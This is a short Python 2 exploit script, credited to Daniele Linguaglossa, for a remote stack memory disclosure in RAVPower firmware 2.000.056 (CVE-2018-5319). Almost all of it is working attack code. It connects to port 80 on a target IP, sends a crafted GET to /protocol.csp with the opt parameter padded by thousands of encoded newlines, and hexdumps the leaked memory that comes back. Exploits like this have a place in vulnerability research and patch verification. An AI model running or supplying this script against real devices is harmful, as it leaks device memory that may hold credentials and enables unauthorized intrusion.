"""

# Exploit Title: RAVPower - remote stack disclosure
# Date: 22/01/2018
# Exploit Author: Daniele Linguaglossa
# Vendor Homepage: https://www.ravpower.com/
# Software Link: https://www.ravpower.com/
# Version: 2.000.056
# Tested on: OSX
# CVE : CVE-2018-5319

"""

import socket
import sys
import re

__author__ =  "Daniele Linguaglossa"

def redall(s):
    tmp = s.recv(1)
    while not str(tmp).endswith("<errno>"):
        tmp+=s.recv(1)
        print tmp
    tmp = str(tmp).split("\r\n\r\n",1)[1]
    return re.sub("[\x0a]+","", tmp,100)

def hexdump(src, length=16):
    FILTER = ''.join([(len(repr(chr(x))) == 3) and chr(x) or '.' for x in range(256)])
    lines = []
    for c in xrange(0, len(src), length):
        chars = src[c:c+length]
        hex = ' '.join(["%02x" % ord(x) for x in chars])
        printable = ''.join(["%s" % ((ord(x) <= 127 and FILTER[ord(x)]) or '.') for x in chars])
        lines.append("%04x  %-*s  %s\n" % (c, length*3, hex, printable))
    return ''.join(lines)

if __name__ == "__main__":
    if len(sys.argv) == 2:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((sys.argv[1],80))
        packet = "GET /protocol.csp?fname=a&opt=%s&function=get HTTP/1.1\r\nConnection: close\r\nHost: {0}\r\n\r\n".format(sys.argv[1])
        packet = packet % ("%0a"*12241)
        s.send(packet)
        result = redall(s)
        print "Dumping memory...\n\n"
        print hexdump(result)
    else:
        print "Usage: {0} <ip>".format(sys.argv[0])